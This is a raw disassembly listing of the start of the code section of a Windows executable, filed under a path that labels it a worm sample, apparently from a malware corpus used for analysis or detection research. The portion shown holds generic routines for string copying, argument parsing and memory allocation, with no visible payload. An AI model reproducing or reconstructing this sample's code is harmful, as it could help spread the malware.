
malware_samples/worm/91d6e0515cc2acd528d0dbabef07b7af8c6c27a083e173a8eb39909ca324b818.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	6a 00                	push   $0x0
  401002:	6a 00                	push   $0x0
  401004:	68 34 b8 42 00       	push   $0x42b834
  401009:	ff 15 40 10 42 00    	call   *0x421040
  40100f:	85 c0                	test   %eax,%eax
  401011:	75 27                	jne    0x40103a
  401013:	ff 15 cc 10 42 00    	call   *0x4210cc
  401019:	85 c0                	test   %eax,%eax
  40101b:	7e 0a                	jle    0x401027
  40101d:	0f b7 c0             	movzwl %ax,%eax
  401020:	0d 00 00 07 80       	or     $0x80070000,%eax
  401025:	85 c0                	test   %eax,%eax
  401027:	79 11                	jns    0x40103a
  401029:	c6 05 48 c9 42 00 01 	movb   $0x1,0x42c948
  401030:	c7 05 30 b8 42 00 00 	movl   $0x0,0x42b830
  401037:	00 00 00 
  40103a:	68 c0 0c 42 00       	push   $0x420cc0
  40103f:	e8 b3 b4 00 00       	call   0x40c4f7
  401044:	59                   	pop    %ecx
  401045:	c3                   	ret
  401046:	b9 38 c0 42 00       	mov    $0x42c038,%ecx
  40104b:	e8 6d c0 00 00       	call   0x40d0bd
  401050:	68 fb 0d 42 00       	push   $0x420dfb
  401055:	e8 9d b4 00 00       	call   0x40c4f7
  40105a:	59                   	pop    %ecx
  40105b:	c3                   	ret
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	55                   	push   %ebp
  401061:	8b ec                	mov    %esp,%ebp
  401063:	83 ec 14             	sub    $0x14,%esp
  401066:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  40106b:	33 c5                	xor    %ebp,%eax
  40106d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401070:	8b 45 0c             	mov    0xc(%ebp),%eax
  401073:	56                   	push   %esi
  401074:	57                   	push   %edi
  401075:	8b f9                	mov    %ecx,%edi
  401077:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40107a:	8b 34 88             	mov    (%eax,%ecx,4),%esi
  40107d:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  401080:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401083:	89 7d f0             	mov    %edi,-0x10(%ebp)
  401086:	8b 17                	mov    (%edi),%edx
  401088:	0f b7 06             	movzwl (%esi),%eax
  40108b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40108e:	f6 c2 01             	test   $0x1,%dl
  401091:	74 05                	je     0x401098
  401093:	83 f8 2d             	cmp    $0x2d,%eax
  401096:	74 12                	je     0x4010aa
  401098:	f6 c2 02             	test   $0x2,%dl
  40109b:	0f 84 8f 01 00 00    	je     0x401230
  4010a1:	83 f8 2f             	cmp    $0x2f,%eax
  4010a4:	0f 85 86 01 00 00    	jne    0x401230
  4010aa:	8b 47 0c             	mov    0xc(%edi),%eax
  4010ad:	53                   	push   %ebx
  4010ae:	8b 5f 08             	mov    0x8(%edi),%ebx
  4010b1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010b4:	8d 46 02             	lea    0x2(%esi),%eax
  4010b7:	3b 5f 0c             	cmp    0xc(%edi),%ebx
  4010ba:	74 6a                	je     0x401126
  4010bc:	0f 1f 40 00          	nopl   0x0(%eax)
  4010c0:	8b 0b                	mov    (%ebx),%ecx
  4010c2:	85 c9                	test   %ecx,%ecx
  4010c4:	74 4d                	je     0x401113
  4010c6:	8b d0                	mov    %eax,%edx
  4010c8:	8d 71 04             	lea    0x4(%ecx),%esi
  4010cb:	8d 7a 02             	lea    0x2(%edx),%edi
  4010ce:	66 90                	xchg   %ax,%ax
  4010d0:	66 8b 0a             	mov    (%edx),%cx
  4010d3:	83 c2 02             	add    $0x2,%edx
  4010d6:	66 85 c9             	test   %cx,%cx
  4010d9:	75 f5                	jne    0x4010d0
  4010db:	2b d7                	sub    %edi,%edx
  4010dd:	8b fe                	mov    %esi,%edi
  4010df:	d1 fa                	sar    $1,%edx
  4010e1:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4010e5:	72 02                	jb     0x4010e9
  4010e7:	8b 3e                	mov    (%esi),%edi
  4010e9:	8b 76 10             	mov    0x10(%esi),%esi
  4010ec:	3b f2                	cmp    %edx,%esi
  4010ee:	75 23                	jne    0x401113
  4010f0:	8b d0                	mov    %eax,%edx
  4010f2:	85 f6                	test   %esi,%esi
  4010f4:	74 25                	je     0x40111b
  4010f6:	2b f8                	sub    %eax,%edi
  4010f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  4010ff:	00 
  401100:	66 8b 0c 17          	mov    (%edi,%edx,1),%cx
  401104:	66 3b 0a             	cmp    (%edx),%cx
  401107:	75 0a                	jne    0x401113
  401109:	83 c2 02             	add    $0x2,%edx
  40110c:	83 ee 01             	sub    $0x1,%esi
  40110f:	75 ef                	jne    0x401100
  401111:	eb 08                	jmp    0x40111b
  401113:	83 c3 04             	add    $0x4,%ebx
  401116:	3b 5d f4             	cmp    -0xc(%ebp),%ebx
  401119:	75 a5                	jne    0x4010c0
  40111b:	8b 7d f0             	mov    -0x10(%ebp),%edi
  40111e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401121:	3b 5f 0c             	cmp    0xc(%edi),%ebx
  401124:	75 25                	jne    0x40114b
  401126:	8b 47 04             	mov    0x4(%edi),%eax
  401129:	c1 e8 05             	shr    $0x5,%eax
  40112c:	a8 01                	test   $0x1,%al
  40112e:	8d 41 01             	lea    0x1(%ecx),%eax
  401131:	75 05                	jne    0x401138
  401133:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  401138:	5b                   	pop    %ebx
  401139:	5f                   	pop    %edi
  40113a:	5e                   	pop    %esi
  40113b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40113e:	33 cd                	xor    %ebp,%ecx
  401140:	e8 b6 b0 00 00       	call   0x40c1fb
  401145:	8b e5                	mov    %ebp,%esp
  401147:	5d                   	pop    %ebp
  401148:	c2 0c 00             	ret    $0xc
  40114b:	8b 33                	mov    (%ebx),%esi
  40114d:	80 7e 34 00          	cmpb   $0x0,0x34(%esi)
  401151:	74 25                	je     0x401178
  401153:	8b 47 04             	mov    0x4(%edi),%eax
  401156:	c1 e8 06             	shr    $0x6,%eax
  401159:	a8 01                	test   $0x1,%al
  40115b:	8d 41 01             	lea    0x1(%ecx),%eax
  40115e:	75 d8                	jne    0x401138
  401160:	5b                   	pop    %ebx
  401161:	5f                   	pop    %edi
  401162:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  401167:	5e                   	pop    %esi
  401168:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40116b:	33 cd                	xor    %ebp,%ecx
  40116d:	e8 89 b0 00 00       	call   0x40c1fb
  401172:	8b e5                	mov    %ebp,%esp
  401174:	5d                   	pop    %ebp
  401175:	c2 0c 00             	ret    $0xc
  401178:	8b 06                	mov    (%esi),%eax
  40117a:	85 c0                	test   %eax,%eax
  40117c:	75 1a                	jne    0x401198
  40117e:	5b                   	pop    %ebx
  40117f:	5f                   	pop    %edi
  401180:	c6 46 34 01          	movb   $0x1,0x34(%esi)
  401184:	8d 41 01             	lea    0x1(%ecx),%eax
  401187:	5e                   	pop    %esi
  401188:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40118b:	33 cd                	xor    %ebp,%ecx
  40118d:	e8 69 b0 00 00       	call   0x40c1fb
  401192:	8b e5                	mov    %ebp,%esp
  401194:	5d                   	pop    %ebp
  401195:	c2 0c 00             	ret    $0xc
  401198:	83 f8 01             	cmp    $0x1,%eax
  40119b:	75 6a                	jne    0x401207
  40119d:	41                   	inc    %ecx
  40119e:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  4011a1:	75 23                	jne    0x4011c6
  4011a3:	8b 47 04             	mov    0x4(%edi),%eax
  4011a6:	c1 e8 07             	shr    $0x7,%eax
  4011a9:	5b                   	pop    %ebx
  4011aa:	a8 01                	test   $0x1,%al
  4011ac:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  4011b1:	5f                   	pop    %edi
  4011b2:	0f 45 c1             	cmovne %ecx,%eax
  4011b5:	5e                   	pop    %esi
  4011b6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011b9:	33 cd                	xor    %ebp,%ecx
  4011bb:	e8 3b b0 00 00       	call   0x40c1fb
  4011c0:	8b e5                	mov    %ebp,%esp
  4011c2:	5d                   	pop    %ebp
  4011c3:	c2 0c 00             	ret    $0xc
  4011c6:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4011c9:	8b 52 04             	mov    0x4(%edx),%edx
  4011cc:	8b ca                	mov    %edx,%ecx
  4011ce:	8d 79 02             	lea    0x2(%ecx),%edi
  4011d1:	66 8b 01             	mov    (%ecx),%ax
  4011d4:	83 c1 02             	add    $0x2,%ecx
  4011d7:	66 85 c0             	test   %ax,%ax
  4011da:	75 f5                	jne    0x4011d1
  4011dc:	2b cf                	sub    %edi,%ecx
  4011de:	d1 f9                	sar    $1,%ecx
  4011e0:	51                   	push   %ecx
  4011e1:	52                   	push   %edx
  4011e2:	8d 4e 1c             	lea    0x1c(%esi),%ecx
  4011e5:	e8 36 01 00 00       	call   0x401320
  4011ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4011ed:	5b                   	pop    %ebx
  4011ee:	5f                   	pop    %edi
  4011ef:	c6 46 34 01          	movb   $0x1,0x34(%esi)
  4011f3:	83 c0 02             	add    $0x2,%eax
  4011f6:	5e                   	pop    %esi
  4011f7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011fa:	33 cd                	xor    %ebp,%ecx
  4011fc:	e8 fa af 00 00       	call   0x40c1fb
  401201:	8b e5                	mov    %ebp,%esp
  401203:	5d                   	pop    %ebp
  401204:	c2 0c 00             	ret    $0xc
  401207:	8b 47 04             	mov    0x4(%edi),%eax
  40120a:	c1 e8 08             	shr    $0x8,%eax
  40120d:	a8 01                	test   $0x1,%al
  40120f:	8d 41 01             	lea    0x1(%ecx),%eax
  401212:	0f 85 20 ff ff ff    	jne    0x401138
  401218:	5b                   	pop    %ebx
  401219:	5f                   	pop    %edi
  40121a:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  40121f:	5e                   	pop    %esi
  401220:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401223:	33 cd                	xor    %ebp,%ecx
  401225:	e8 d1 af 00 00       	call   0x40c1fb
  40122a:	8b e5                	mov    %ebp,%esp
  40122c:	5d                   	pop    %ebp
  40122d:	c2 0c 00             	ret    $0xc
  401230:	8b 47 04             	mov    0x4(%edi),%eax
  401233:	c1 e8 04             	shr    $0x4,%eax
  401236:	a8 01                	test   $0x1,%al
  401238:	74 15                	je     0x40124f
  40123a:	5f                   	pop    %edi
  40123b:	8d 41 01             	lea    0x1(%ecx),%eax
  40123e:	5e                   	pop    %esi
  40123f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401242:	33 cd                	xor    %ebp,%ecx
  401244:	e8 b2 af 00 00       	call   0x40c1fb
  401249:	8b e5                	mov    %ebp,%esp
  40124b:	5d                   	pop    %ebp
  40124c:	c2 0c 00             	ret    $0xc
  40124f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401252:	83 c8 ff             	or     $0xffffffff,%eax
  401255:	5f                   	pop    %edi
  401256:	33 cd                	xor    %ebp,%ecx
  401258:	5e                   	pop    %esi
  401259:	e8 9d af 00 00       	call   0x40c1fb
  40125e:	8b e5                	mov    %ebp,%esp
  401260:	5d                   	pop    %ebp
  401261:	c2 0c 00             	ret    $0xc
  401264:	cc                   	int3
  401265:	cc                   	int3
  401266:	cc                   	int3
  401267:	cc                   	int3
  401268:	cc                   	int3
  401269:	cc                   	int3
  40126a:	cc                   	int3
  40126b:	cc                   	int3
  40126c:	cc                   	int3
  40126d:	cc                   	int3
  40126e:	cc                   	int3
  40126f:	cc                   	int3
  401270:	56                   	push   %esi
  401271:	8b f1                	mov    %ecx,%esi
  401273:	8b 4e 14             	mov    0x14(%esi),%ecx
  401276:	83 f9 08             	cmp    $0x8,%ecx
  401279:	72 2d                	jb     0x4012a8
  40127b:	8b 06                	mov    (%esi),%eax
  40127d:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  401284:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40128a:	72 12                	jb     0x40129e
  40128c:	8b 50 fc             	mov    -0x4(%eax),%edx
  40128f:	83 c1 23             	add    $0x23,%ecx
  401292:	2b c2                	sub    %edx,%eax
  401294:	83 c0 fc             	add    $0xfffffffc,%eax
  401297:	83 f8 1f             	cmp    $0x1f,%eax
  40129a:	77 21                	ja     0x4012bd
  40129c:	8b c2                	mov    %edx,%eax
  40129e:	51                   	push   %ecx
  40129f:	50                   	push   %eax
  4012a0:	e8 67 af 00 00       	call   0x40c20c
  4012a5:	83 c4 08             	add    $0x8,%esp
  4012a8:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4012af:	33 c0                	xor    %eax,%eax
  4012b1:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  4012b8:	66 89 06             	mov    %ax,(%esi)
  4012bb:	5e                   	pop    %esi
  4012bc:	c3                   	ret
  4012bd:	e8 d7 ee 00 00       	call   0x410199
  4012c2:	cc                   	int3
  4012c3:	cc                   	int3
  4012c4:	cc                   	int3
  4012c5:	cc                   	int3
  4012c6:	cc                   	int3
  4012c7:	cc                   	int3
  4012c8:	cc                   	int3
  4012c9:	cc                   	int3
  4012ca:	cc                   	int3
  4012cb:	cc                   	int3
  4012cc:	cc                   	int3
  4012cd:	cc                   	int3
  4012ce:	cc                   	int3
  4012cf:	cc                   	int3
  4012d0:	55                   	push   %ebp
  4012d1:	8b ec                	mov    %esp,%ebp
  4012d3:	8b 55 08             	mov    0x8(%ebp),%edx
  4012d6:	33 c0                	xor    %eax,%eax
  4012d8:	56                   	push   %esi
  4012d9:	8b f1                	mov    %ecx,%esi
  4012db:	57                   	push   %edi
  4012dc:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4012e3:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  4012ea:	66 89 06             	mov    %ax,(%esi)
  4012ed:	8b c2                	mov    %edx,%eax
  4012ef:	8d 78 02             	lea    0x2(%eax),%edi
  4012f2:	66 8b 08             	mov    (%eax),%cx
  4012f5:	83 c0 02             	add    $0x2,%eax
  4012f8:	66 85 c9             	test   %cx,%cx
  4012fb:	75 f5                	jne    0x4012f2
  4012fd:	2b c7                	sub    %edi,%eax
  4012ff:	8b ce                	mov    %esi,%ecx
  401301:	d1 f8                	sar    $1,%eax
  401303:	50                   	push   %eax
  401304:	52                   	push   %edx
  401305:	e8 16 00 00 00       	call   0x401320
  40130a:	5f                   	pop    %edi
  40130b:	8b c6                	mov    %esi,%eax
  40130d:	5e                   	pop    %esi
  40130e:	5d                   	pop    %ebp
  40130f:	c2 04 00             	ret    $0x4
  401312:	cc                   	int3
  401313:	cc                   	int3
  401314:	cc                   	int3
  401315:	cc                   	int3
  401316:	cc                   	int3
  401317:	cc                   	int3
  401318:	cc                   	int3
  401319:	cc                   	int3
  40131a:	cc                   	int3
  40131b:	cc                   	int3
  40131c:	cc                   	int3
  40131d:	cc                   	int3
  40131e:	cc                   	int3
  40131f:	cc                   	int3
  401320:	55                   	push   %ebp
  401321:	8b ec                	mov    %esp,%ebp
  401323:	83 ec 0c             	sub    $0xc,%esp
  401326:	8b 45 0c             	mov    0xc(%ebp),%eax
  401329:	8b 55 08             	mov    0x8(%ebp),%edx
  40132c:	53                   	push   %ebx
  40132d:	56                   	push   %esi
  40132e:	57                   	push   %edi
  40132f:	8b f9                	mov    %ecx,%edi
  401331:	89 55 f8             	mov    %edx,-0x8(%ebp)
  401334:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401337:	8b 4f 14             	mov    0x14(%edi),%ecx
  40133a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40133d:	3b c1                	cmp    %ecx,%eax
  40133f:	77 2b                	ja     0x40136c
  401341:	8b df                	mov    %edi,%ebx
  401343:	83 f9 08             	cmp    $0x8,%ecx
  401346:	72 02                	jb     0x40134a
  401348:	8b 1f                	mov    (%edi),%ebx
  40134a:	8d 34 00             	lea    (%eax,%eax,1),%esi
  40134d:	89 47 10             	mov    %eax,0x10(%edi)
  401350:	56                   	push   %esi
  401351:	52                   	push   %edx
  401352:	53                   	push   %ebx
  401353:	e8 a8 cc 00 00       	call   0x40e000
  401358:	83 c4 0c             	add    $0xc,%esp
  40135b:	33 c0                	xor    %eax,%eax
  40135d:	66 89 04 1e          	mov    %ax,(%esi,%ebx,1)
  401361:	8b c7                	mov    %edi,%eax
  401363:	5f                   	pop    %edi
  401364:	5e                   	pop    %esi
  401365:	5b                   	pop    %ebx
  401366:	8b e5                	mov    %ebp,%esp
  401368:	5d                   	pop    %ebp
  401369:	c2 08 00             	ret    $0x8
  40136c:	3d fe ff ff 7f       	cmp    $0x7ffffffe,%eax
  401371:	0f 87 e8 00 00 00    	ja     0x40145f
  401377:	8b f0                	mov    %eax,%esi
  401379:	83 ce 07             	or     $0x7,%esi
  40137c:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  401382:	76 07                	jbe    0x40138b
  401384:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  401389:	eb 1e                	jmp    0x4013a9
  40138b:	8b d1                	mov    %ecx,%edx
  40138d:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  401392:	d1 ea                	shr    $1,%edx
  401394:	2b c2                	sub    %edx,%eax
  401396:	3b c8                	cmp    %eax,%ecx
  401398:	76 07                	jbe    0x4013a1
  40139a:	be fe ff ff 7f       	mov    $0x7ffffffe,%esi
  40139f:	eb 08                	jmp    0x4013a9
  4013a1:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4013a4:	3b f0                	cmp    %eax,%esi
  4013a6:	0f 42 f0             	cmovb  %eax,%esi
  4013a9:	8d 46 01             	lea    0x1(%esi),%eax
  4013ac:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  4013af:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013b4:	76 05                	jbe    0x4013bb
  4013b6:	83 c9 ff             	or     $0xffffffff,%ecx
  4013b9:	eb 08                	jmp    0x4013c3
  4013bb:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4013c1:	72 23                	jb     0x4013e6
  4013c3:	8d 41 23             	lea    0x23(%ecx),%eax
  4013c6:	83 ca ff             	or     $0xffffffff,%edx
  4013c9:	3b c1                	cmp    %ecx,%eax
  4013cb:	0f 46 c2             	cmovbe %edx,%eax
  4013ce:	50                   	push   %eax
  4013cf:	e8 46 ae 00 00       	call   0x40c21a
  4013d4:	83 c4 04             	add    $0x4,%esp
  4013d7:	85 c0                	test   %eax,%eax
  4013d9:	74 7f                	je     0x40145a
  4013db:	8d 58 23             	lea    0x23(%eax),%ebx
  4013de:	83 e3 e0             	and    $0xffffffe0,%ebx
  4013e1:	89 43 fc             	mov    %eax,-0x4(%ebx)
  4013e4:	eb 13                	jmp    0x4013f9
  4013e6:	85 c9                	test   %ecx,%ecx
  4013e8:	74 0d                	je     0x4013f7
  4013ea:	51                   	push   %ecx
  4013eb:	e8 2a ae 00 00       	call   0x40c21a
  4013f0:	83 c4 04             	add    $0x4,%esp
  4013f3:	8b d8                	mov    %eax,%ebx
  4013f5:	eb 02                	jmp    0x4013f9
  4013f7:	33 db                	xor    %ebx,%ebx
  4013f9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4013fc:	89 77 14             	mov    %esi,0x14(%edi)
  4013ff:	89 47 10             	mov    %eax,0x10(%edi)
  401402:	8d 34 00             	lea    (%eax,%eax,1),%esi
  401405:	56                   	push   %esi
  401406:	ff 75 f8             	push   -0x8(%ebp)
  401409:	53                   	push   %ebx
  40140a:	e8 41 e6 00 00       	call   0x40fa50
  40140f:	33 c0                	xor    %eax,%eax
  401411:	83 c4 0c             	add    $0xc,%esp
  401414:	66 89 04 1e          	mov    %ax,(%esi,%ebx,1)
  401418:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40141b:	83 f8 08             	cmp    $0x8,%eax
  40141e:	72 2d                	jb     0x40144d
  401420:	8d 0c 45 02 00 00 00 	lea    0x2(,%eax,2),%ecx
  401427:	8b 07                	mov    (%edi),%eax
  401429:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40142f:	72 12                	jb     0x401443
  401431:	8b 50 fc             	mov    -0x4(%eax),%edx
  401434:	83 c1 23             	add    $0x23,%ecx
  401437:	2b c2                	sub    %edx,%eax
  401439:	83 c0 fc             	add    $0xfffffffc,%eax
  40143c:	83 f8 1f             	cmp    $0x1f,%eax
  40143f:	77 19                	ja     0x40145a
  401441:	8b c2                	mov    %edx,%eax
  401443:	51                   	push   %ecx
  401444:	50                   	push   %eax
  401445:	e8 c2 ad 00 00       	call   0x40c20c
  40144a:	83 c4 08             	add    $0x8,%esp
  40144d:	89 1f                	mov    %ebx,(%edi)
  40144f:	8b c7                	mov    %edi,%eax
  401451:	5f                   	pop    %edi
  401452:	5e                   	pop    %esi
  401453:	5b                   	pop    %ebx
  401454:	8b e5                	mov    %ebp,%esp
  401456:	5d                   	pop    %ebp
  401457:	c2 08 00             	ret    $0x8
  40145a:	e8 3a ed 00 00       	call   0x410199
  40145f:	e8 7c 01 00 00       	call   0x4015e0
  401464:	cc                   	int3
  401465:	cc                   	int3
  401466:	cc                   	int3
  401467:	cc                   	int3
  401468:	cc                   	int3
  401469:	cc                   	int3
  40146a:	cc                   	int3
  40146b:	cc                   	int3
  40146c:	cc                   	int3
  40146d:	cc                   	int3
  40146e:	cc                   	int3
  40146f:	cc                   	int3
  401470:	55                   	push   %ebp
  401471:	8b ec                	mov    %esp,%ebp
  401473:	83 ec 10             	sub    $0x10,%esp
  401476:	53                   	push   %ebx
  401477:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40147a:	56                   	push   %esi
  40147b:	57                   	push   %edi
  40147c:	8b f9                	mov    %ecx,%edi
  40147e:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  401481:	8b 17                	mov    (%edi),%edx
  401483:	2b da                	sub    %edx,%ebx
  401485:	8b 47 04             	mov    0x4(%edi),%eax
  401488:	2b c2                	sub    %edx,%eax
  40148a:	c1 fb 02             	sar    $0x2,%ebx
  40148d:	c1 f8 02             	sar    $0x2,%eax
  401490:	3d ff ff ff 3f       	cmp    $0x3fffffff,%eax
  401495:	0f 84 2c 01 00 00    	je     0x4015c7
  40149b:	8b 4f 08             	mov    0x8(%edi),%ecx
  40149e:	8d 70 01             	lea    0x1(%eax),%esi
  4014a1:	2b ca                	sub    %edx,%ecx
  4014a3:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4014a6:	c1 f9 02             	sar    $0x2,%ecx
  4014a9:	b8 ff ff ff 3f       	mov    $0x3fffffff,%eax
  4014ae:	8b d1                	mov    %ecx,%edx
  4014b0:	d1 ea                	shr    $1,%edx
  4014b2:	2b c2                	sub    %edx,%eax
  4014b4:	3b c8                	cmp    %eax,%ecx
  4014b6:	76 04                	jbe    0x4014bc
  4014b8:	8b c6                	mov    %esi,%eax
  4014ba:	eb 08                	jmp    0x4014c4
  4014bc:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4014bf:	3b c6                	cmp    %esi,%eax
  4014c1:	0f 42 c6             	cmovb  %esi,%eax
  4014c4:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
  4014cb:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4014ce:	3d ff ff ff 3f       	cmp    $0x3fffffff,%eax
  4014d3:	76 05                	jbe    0x4014da
  4014d5:	83 c9 ff             	or     $0xffffffff,%ecx
  4014d8:	eb 08                	jmp    0x4014e2
  4014da:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4014e0:	72 27                	jb     0x401509
  4014e2:	8d 41 23             	lea    0x23(%ecx),%eax
  4014e5:	83 ca ff             	or     $0xffffffff,%edx
  4014e8:	3b c1                	cmp    %ecx,%eax
  4014ea:	0f 46 c2             	cmovbe %edx,%eax
  4014ed:	50                   	push   %eax
  4014ee:	e8 27 ad 00 00       	call   0x40c21a
  4014f3:	83 c4 04             	add    $0x4,%esp
  4014f6:	85 c0                	test   %eax,%eax
  4014f8:	0f 84 c4 00 00 00    	je     0x4015c2
  4014fe:	8d 70 23             	lea    0x23(%eax),%esi
  401501:	83 e6 e0             	and    $0xffffffe0,%esi
  401504:	89 46 fc             	mov    %eax,-0x4(%esi)
  401507:	eb 13                	jmp    0x40151c
  401509:	85 c9                	test   %ecx,%ecx
  40150b:	74 0d                	je     0x40151a
  40150d:	51                   	push   %ecx
  40150e:	e8 07 ad 00 00       	call   0x40c21a
  401513:	83 c4 04             	add    $0x4,%esp
  401516:	8b f0                	mov    %eax,%esi
  401518:	eb 02                	jmp    0x40151c
  40151a:	33 f6                	xor    %esi,%esi
  40151c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40151f:	8d 0c 9d 00 00 00 00 	lea    0x0(,%ebx,4),%ecx
  401526:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  401529:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40152c:	8b 00                	mov    (%eax),%eax
  40152e:	89 04 31             	mov    %eax,(%ecx,%esi,1)
  401531:	8b 47 04             	mov    0x4(%edi),%eax
  401534:	8b 0f                	mov    (%edi),%ecx
  401536:	3b d8                	cmp    %eax,%ebx
  401538:	75 12                	jne    0x40154c
  40153a:	2b c1                	sub    %ecx,%eax
  40153c:	50                   	push   %eax
  40153d:	51                   	push   %ecx
  40153e:	56                   	push   %esi
  40153f:	e8 bc ca 00 00       	call   0x40e000
  401544:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401547:	83 c4 0c             	add    $0xc,%esp
  40154a:	eb 24                	jmp    0x401570
  40154c:	8b c3                	mov    %ebx,%eax
  40154e:	2b c1                	sub    %ecx,%eax
  401550:	50                   	push   %eax
  401551:	51                   	push   %ecx
  401552:	56                   	push   %esi
  401553:	e8 a8 ca 00 00       	call   0x40e000
  401558:	8b 47 04             	mov    0x4(%edi),%eax
  40155b:	2b c3                	sub    %ebx,%eax
  40155d:	50                   	push   %eax
  40155e:	53                   	push   %ebx
  40155f:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401562:	8d 43 04             	lea    0x4(%ebx),%eax
  401565:	03 c6                	add    %esi,%eax
  401567:	50                   	push   %eax
  401568:	e8 93 ca 00 00       	call   0x40e000
  40156d:	83 c4 18             	add    $0x18,%esp
  401570:	8b 07                	mov    (%edi),%eax
  401572:	85 c0                	test   %eax,%eax
  401574:	74 2c                	je     0x4015a2
  401576:	8b 4f 08             	mov    0x8(%edi),%ecx
  401579:	2b c8                	sub    %eax,%ecx
  40157b:	83 e1 fc             	and    $0xfffffffc,%ecx
  40157e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401584:	72 12                	jb     0x401598
  401586:	8b 50 fc             	mov    -0x4(%eax),%edx
  401589:	83 c1 23             	add    $0x23,%ecx
  40158c:	2b c2                	sub    %edx,%eax
  40158e:	83 c0 fc             	add    $0xfffffffc,%eax
  401591:	83 f8 1f             	cmp    $0x1f,%eax
  401594:	77 2c                	ja     0x4015c2
  401596:	8b c2                	mov    %edx,%eax
  401598:	51                   	push   %ecx
  401599:	50                   	push   %eax
  40159a:	e8 6d ac 00 00       	call   0x40c20c
  40159f:	83 c4 08             	add    $0x8,%esp
  4015a2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4015a5:	89 37                	mov    %esi,(%edi)
  4015a7:	8d 04 86             	lea    (%esi,%eax,4),%eax
  4015aa:	89 47 04             	mov    %eax,0x4(%edi)
  4015ad:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4015b0:	03 c6                	add    %esi,%eax
  4015b2:	89 47 08             	mov    %eax,0x8(%edi)
  4015b5:	8b 07                	mov    (%edi),%eax
  4015b7:	5f                   	pop    %edi
  4015b8:	5e                   	pop    %esi
  4015b9:	03 c3                	add    %ebx,%eax
  4015bb:	5b                   	pop    %ebx
  4015bc:	8b e5                	mov    %ebp,%esp
  4015be:	5d                   	pop    %ebp
  4015bf:	c2 08 00             	ret    $0x8
  4015c2:	e8 d2 eb 00 00       	call   0x410199
  4015c7:	e8 04 00 00 00       	call   0x4015d0
  4015cc:	cc                   	int3
  4015cd:	cc                   	int3
  4015ce:	cc                   	int3
  4015cf:	cc                   	int3
  4015d0:	68 c8 6c 42 00       	push   $0x426cc8
  4015d5:	e8 d4 ab 00 00       	call   0x40c1ae
  4015da:	cc                   	int3
  4015db:	cc                   	int3
  4015dc:	cc                   	int3
  4015dd:	cc                   	int3
  4015de:	cc                   	int3
  4015df:	cc                   	int3
  4015e0:	68 dc 6c 42 00       	push   $0x426cdc
  4015e5:	e8 c4 ab 00 00       	call   0x40c1ae
  4015ea:	cc                   	int3
  4015eb:	cc                   	int3
  4015ec:	cc                   	int3
  4015ed:	cc                   	int3
  4015ee:	cc                   	int3
  4015ef:	cc                   	int3
  4015f0:	55                   	push   %ebp
  4015f1:	8b ec                	mov    %esp,%ebp
  4015f3:	81 ec 64 02 00 00    	sub    $0x264,%esp
  4015f9:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  4015fe:	33 c5                	xor    %ebp,%eax
  401600:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401603:	53                   	push   %ebx
  401604:	56                   	push   %esi
  401605:	57                   	push   %edi
  401606:	68 f4 01 00 00       	push   $0x1f4
